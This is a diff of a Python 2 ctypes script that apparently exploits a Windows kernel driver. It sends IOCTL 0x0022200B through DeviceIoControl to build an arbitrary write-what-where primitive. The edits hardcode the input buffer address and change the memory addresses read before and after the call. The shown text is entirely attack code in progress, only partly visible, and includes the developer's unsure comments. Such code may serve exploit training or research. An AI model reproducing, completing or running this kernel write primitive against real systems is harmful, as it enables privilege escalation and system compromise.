@@ -197,7 +197,7 @@ def writePrimitive(driver, what=0x4141414141414141, where=0x4242424242424242):
     #IOCTL
     IoControlCode = 0x0022200B
     #Where
-    InputBuffer = what_addr
+    InputBuffer = c_void_p(0x000000001a000000)
     # I THINK this should work? 
     InputBufferLength = 0x10 # can't take length of a void pointer len(InputBuffer) 
     # If our buffer length is zero can't we set OutputBuffer to None?
@@ -207,9 +207,9 @@ def writePrimitive(driver, what=0x4141414141414141, where=0x4242424242424242):
     dwBytesReturned = c_ulong()
     lpBytesReturned = byref(dwBytesReturned)
 
-    print "Value before DeviceIoControl: %08x" % cast(0x000000001a000000, POINTER(c_ulonglong))[0]
+    print "Value before DeviceIoControl: %08x" % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
     triggerIOCTL = kernel32.DeviceIoControl(driver, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, lpBytesReturned, NULL)
-    print "Value after: %08x" % cast(0x000000001a000000, POINTER(c_ulonglong))[0]
+    print "Value after: %08x" % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
     
     return triggerIOCTL
 
@@ -395,3 +395,4 @@ def executeOverwrite():
 ############################################ RUN ################################################
 
 executeOverwrite()
+
